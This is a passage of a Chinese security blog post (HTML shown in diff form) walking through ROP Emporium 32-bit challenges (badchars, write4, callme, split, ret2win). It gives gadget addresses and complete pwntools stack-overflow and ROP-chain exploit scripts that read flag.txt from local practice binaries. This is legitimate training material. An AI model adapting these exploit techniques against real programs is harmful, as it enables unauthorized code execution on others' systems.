xor</span><br><span class="hljs-comment"># 0x080485bb : pop ebp ; ret</span><br><span class="hljs-comment"># 0x0804839d : pop ebx ; ret</span><br><span class="hljs-comment"># 0x08048547 : xor byte ptr [ebp], bl ; ret</span><br>pop_esi_edi_ebp = <span class="hljs-number">0x080485b9</span><br>mov_edi_esi = <span class="hljs-number">0x0804854f</span><br><br>pop_ebp = <span class="hljs-number">0x080485bb</span><br>pop_ebx = <span class="hljs-number">0x0804839d</span><br>xor_ebp_bl = <span class="hljs-number">0x08048547</span><br>xor_byte = <span class="hljs-number">0x16</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">xor_encode</span>(<span class="hljs-params">xor_byte</span>):<br>    badchars = [<span class="hljs-string">&#x27;x&#x27;</span>, <span class="hljs-string">&#x27;g&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;.&#x27;</span>]<br>    flag = <span class="hljs-string">&quot;flag.txt&quot;</span><br><br>    <span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>        flag_file = <span class="hljs-string">&#x27;&#x27;</span><br>        index = []<br>        i = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> flag:<br>            <span class="hljs-keyword">if</span> _ <span class="hljs-keyword">in</span> badchars:<br>                c = <span class="hljs-built_in">ord</span>(_) ^ xor_byte<br>                <span class="hljs-keyword">if</span> <span class="hljs-built_in">chr</span>(c) <span class="hljs-keyword">in</span> badchars:<br>                    xor_byte += <span class="hljs-number">1</span><br>                    <span class="hljs-keyword">break</span><br>                <span class="hljs-keyword">else</span>:<br>                    index.append(flag.index(_))<br>                    flag_file += <span class="hljs-built_in">chr</span>(c)<br>            <span class="hljs-keyword">else</span>:<br>                flag_file += _<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(flag_file) == <span class="hljs-number">8</span>:<br>            <span class="hljs-keyword">break</span><br><br>    <span class="hljs-keyword">return</span> flag_file, index<br><br><br>flag_file, index = xor_encode(xor_byte)<br>print_file_plt = elf.plt[<span class="hljs-string">&#x27;print_file&#x27;</span>]<br>data_addr = elf.bss()<br><br><span class="hljs-comment"># write flag.txt</span><br>write_flagfile = <span class="hljs-string">b&#x27;&#x27;</span><br>write_flagfile += p32(pop_esi_edi_ebp) + <span class="hljs-built_in">bytes</span>(<br>    flag_file[:<span class="hljs-number">4</span>],<br>    encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) + p32(data_addr) + <span class="hljs-string">b&#x27;AAAA&#x27;</span> + p32(mov_edi_esi)<br>write_flagfile += p32(pop_esi_edi_ebp) + <span class="hljs-built_in">bytes</span>(<br>    flag_file[<span class="hljs-number">4</span>:<span class="hljs-number">8</span>],<br>    encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) + p32(data_addr + <span class="hljs-number">4</span>) + <span class="hljs-string">b&#x27;AAAA&#x27;</span> + p32(mov_edi_esi)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> index:<br>    write_flagfile += p32(pop_ebp)<br>    write_flagfile += p32(data_addr + i)<br>    write_flagfile += p32(pop_ebx)<br>    write_flagfile += p32(xor_byte)<br>    write_flagfile += p32(xor_ebp_bl)<br><br>payload = <span class="hljs-string">b&#x27;&#x27;</span><br>payload += <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">44</span><br>payload += write_flagfile<br>payload += p32(print_file_plt)<br>payload += <span class="hljs-string">b&#x27;AAAA&#x27;</span><br>payload += p32(data_addr)<br><br>io.recvuntil(<span class="hljs-string">b&#x27;&gt; &#x27;</span>)<br>io.sendline(payload)<br>io.recvuntil(<span class="hljs-string">b&#x27;you!\n&#x27;</span>)<br>io.recv()<br><br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="write4"><a href="#write4" class="headerlink" title="write4"></a>write4</h2><p>题目说明来看，有一点不同</p>
+<blockquote>
+<p>Hopefully you’ve realised that ROP is just a form of arbitrary code execution and if we get creative we can leverage it to do things like write to or read from memory. The question we need to answer is: what mechanism are we going to use to solve this problem? Is there any built-in functionality to do the writing or do we need to use gadgets? In this challenge we won’t be using built-in functionality since that’s too similar to the previous challenges, instead we’ll be looking for gadgets that let us write a value to memory such as <code>mov [reg], reg</code>.</p>
+</blockquote>
+<p>根据提示，查找gadget</p>
+<p><img src="/2022/12/22/ROP%E4%B9%8Bret2csu/image-20230105102108346.png" srcset="/img/loading.gif" lazyload alt="image-20230105102108346"></p>
+<p>所以一个思路就是：</p>
+<ol>
+<li>存储”flag”在ebp</li>
+<li>存储.bss地址在edi</li>
+<li>将”flag”传递到.bss</li>
+<li>将”.txt”传递到.bss+4</li>
+<li>调用print_file(.bss)</li>
+</ol>
+<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>io = process(<span class="hljs-string">&#x27;./write432&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./write432&#x27;</span>)<br><br>print_file_plt = p32(elf.plt[<span class="hljs-string">&#x27;print_file&#x27;</span>])<br>bss = p32(elf.bss())<br>pop_edi_ebp = p32(<span class="hljs-number">0x080485aa</span>)<br>mov_gadget = p32(<span class="hljs-number">0x08048543</span>)<br><br><span class="hljs-comment"># 0x08048543 : mov dword ptr [edi], ebp ; ret</span><br><span class="hljs-comment"># 0x080485aa : pop edi ; pop ebp ; ret</span><br><br><span class="hljs-comment"># step1: pass &quot;flag.txt&quot;</span><br>p = <span class="hljs-string">b&#x27;&#x27;</span><br>p += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">44</span><br>p += pop_edi_ebp<br>p += bss<br>p += <span class="hljs-string">b&quot;flag&quot;</span><br>p += mov_gadget<br>p += pop_edi_ebp<br>p += p32(elf.bss() + <span class="hljs-number">4</span>)<br>p += <span class="hljs-string">b&quot;.txt&quot;</span><br>p += mov_gadget<br><br><span class="hljs-comment"># step2: call print_file(&quot;flag.txt&quot;)</span><br>p += print_file_plt<br>p += <span class="hljs-string">b&#x27;aaaa&#x27;</span><br>p += bss<br><br>io.recvuntil(<span class="hljs-string">b&#x27;&gt; &#x27;</span>)<br>io.sendline(p)<br>io.recvuntil(<span class="hljs-string">b&#x27;you!\n&#x27;</span>)<br>io.recv()<br><br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="callme"><a href="#callme" class="headerlink" title="callme"></a>callme</h2><p>通过分析，需要完成Rop链：callme_one-&gt;calllme_two-&gt;callme_three，并且参数传递满足如下规则</p>
+<p><img src="/2022/12/22/ROP%E4%B9%8Bret2csu/image-20230103141013806.png" srcset="/img/loading.gif" lazyload alt="image-20230103141013806"></p>
+<p>思路清晰，中间需要一个gadget清理栈并ret：<code>0x080487f9 : pop esi ; pop edi ; pop ebp ; ret</code></p>
+<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>io = process(<span class="hljs-string">&#x27;./callme32&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./callme32&#x27;</span>)<br><br>callme_one = p32(elf.symbols[<span class="hljs-string">&#x27;callme_one&#x27;</span>])<br>callme_two = p32(elf.symbols[<span class="hljs-string">&#x27;callme_two&#x27;</span>])<br>callme_three = p32(elf.symbols[<span class="hljs-string">&#x27;callme_three&#x27;</span>])<br>a1 = p32(<span class="hljs-number">0xdeadbeef</span>)<br>a2 = p32(<span class="hljs-number">0xcafebabe</span>)<br>a3 = p32(<span class="hljs-number">0xd00df00d</span>)<br>args = a1 + a2 + a3<br>pop_ret = p32(<span class="hljs-number">0x080487f9</span>)<br><span class="hljs-comment"># 0x080487f9 : pop esi ; pop edi ; pop ebp ; ret</span><br><br>p = <span class="hljs-string">b&#x27;&#x27;</span><br>p += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">44</span><br>p += callme_one<br>p += pop_ret<br>p += args<br>p += callme_two<br>p += pop_ret<br>p += args<br>p += callme_three<br>p += pop_ret<br>p += args<br><br>io.recvuntil(<span class="hljs-string">b&#x27;&gt; &#x27;</span>)<br>io.sendline(p)<br>io.recvuntil(<span class="hljs-string">b&#x27;you!\n&#x27;</span>)<br>io.recv()<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2022/12/22/ROP%E4%B9%8Bret2csu/image-20230103141243696.png" srcset="/img/loading.gif" lazyload alt="image-20230103141243696"></p>
+<h2 id="split"><a href="#split" class="headerlink" title="split"></a>split</h2><p>基本运行情况</p>
+<p><img src="/2022/12/22/ROP%E4%B9%8Bret2csu/image-20230101122118666.png" srcset="/img/loading.gif" lazyload alt="image-20230101122118666"></p>
+<h3 id="基本分析"><a href="#基本分析" class="headerlink" title="基本分析"></a>基本分析</h3><p>nm查看符号表信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(tiger㉿kali)-[~/桌面/split]<br>└─$ nm split32|grep <span class="hljs-string">&#x27; t &#x27;</span><br>08048490 t deregister_tm_clones<br>08048510 t __do_global_dtors_aux<br>08048540 t frame_dummy<br>080485ad t pwnme<br>080484d0 t register_tm_clones<br>0804860c t usefulFunction<br><br></code></pre></td></tr></table></figure>
+
+<p>需要关注<code>pwnme</code>和<code>usefulFunction</code>，pwnme中还是一样的溢出点，不过usefulFunction不太一样，执行<code>system(&quot;/bin/ls&quot;)</code></p>
+<p><img src="/2022/12/22/ROP%E4%B9%8Bret2csu/image-20230101123511596.png" srcset="/img/loading.gif" lazyload alt="image-20230101123511596"></p>
+<p>IDA拖入后发现存在可用字符串：&#x2F;bin&#x2F;cat flag.txt</p>
+<p><img src="/2022/12/22/ROP%E4%B9%8Bret2csu/image-20230101124233579.png" srcset="/img/loading.gif" lazyload alt="image-20230101124233579"></p>
+<p>思路清晰：溢出到userfulFuction，并传入参数：<code>/bin/cat flag.txt</code>的地址</p>
+<h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">from pwn import *<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>io = process(<span class="hljs-string">&#x27;./split/split32&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./split/split32&#x27;</span>)<br><br>bincat_addr = 0x0804a030<br><span class="hljs-comment"># call system</span><br>system_addr = elf.plt[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>p = b<span class="hljs-string">&#x27;a&#x27;</span> * 44<br>p += p32(system_addr)<br>p += b<span class="hljs-string">&#x27;bbbb&#x27;</span><br>p += p32(bincat_addr)<br><br>io.recvuntil(b<span class="hljs-string">&#x27;&gt; &#x27;</span>)<br>io.sendline(p)<br>io.recvuntil(b<span class="hljs-string">&#x27;you!\n&#x27;</span>)<br>io.recv()<br></code></pre></td></tr></table></figure>
+
+<h2 id="ret2win"><a href="#ret2win" class="headerlink" title="ret2win"></a>ret2win</h2><p><img src="/2022/12/22/ROP%E4%B9%8Bret2csu/image-20221230081632881.png" srcset="/img/loading.gif" lazyload alt="image-20221230081632881"></p>
+<p>保护措施来看，并没有很多安全措施</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(tiger㉿kali)-[~/桌面]<br>└─$ checksec --file=./ret2win32<br>RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE<br>Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   72 Symbols        No    0               3               ./ret2win32<br><br></code></pre></td></tr></table></figure>
+
+<p>nm查看二进制信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">nm ret2win|grep <span class="hljs-string">&#x27; t &#x27;</span><br>08048490 t deregister_tm_clones<br>08048510 t __do_global_dtors_aux<br>08048540 t frame_dummy<br>080485ad t pwnme<br>080484d0 t register_tm_clones<br><span class="hljs-comment"># 此处有一个独特的函数</span><br>0804862c t ret2win<br></code></pre></td></tr></table></figure>
+
+<p>使用<code>r2</code>进行初步re，辅助查看</p>
+<p>pwnme函数中调用read，存在溢出点</p>
+<p><img src="/2022/12/22/ROP%E4%B9%8Bret2csu/image-20221230082028956.png" srcset="/img/loading.gif" lazyload alt="image-20221230082028956"></p>
+<p><img src="/2022/12/22/ROP%E4%B9%8Bret2csu/image-20221230081146429.png" srcset="/img/loading.gif" lazyload alt="image-20221230081146429"></p>
+<p>思路很清晰，栈溢出并能ret到<code>ret2win</code>地址</p>
+<h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>io = process(<span class="hljs-string">&#x27;./ret2win32&#x27;</span>)<br><br>ret2win_addr = <span class="hljs-number">0x804862c</span><br><span class="hljs-comment"># 可使用msf-pattern_create msf-pattern_offset来确定padding</span><br>p = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">40</span><br>p += <span class="hljs-string">b&#x27;b&#x27;</span> * <span class="hljs-number">4</span><br>p += p32(ret2win_addr)<br><br>io.recvuntil(<span class="hljs-string">b&#x27;&gt; &#x27;</span>)<br>io.sendline(p)<br>io.recvuntil(<span class="hljs-string">b&#x27;flag:\n&#x27;</span>)<br>io.recv()<br></code></pre></td></tr></table></figure>
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>以<a target="_blank" rel="noopener" href="https://ropemporium.com/">ROP系列</a>作为栈溢出学习点收尾，Stack over flow就告一段了。开启堆相关的内容😄</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/">#二进制</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>ROP之ret2csu</div>
+      <div>http://example.com/2022/12/22/ROP之ret2csu/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>尘埃落定</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年12月22日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/12/19/ArmPwn%E5%88%9D%E7%BA%A7/" title="ArmPwn初级">
+                        <span class="hidden-mobile">ArmPwn初级</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
 
 
 
   
-<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
 
 
 
 
-<script src="/js/script.js"></script>
 
 
 
+    
 
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
 
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
   </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
 </body>
 </html>
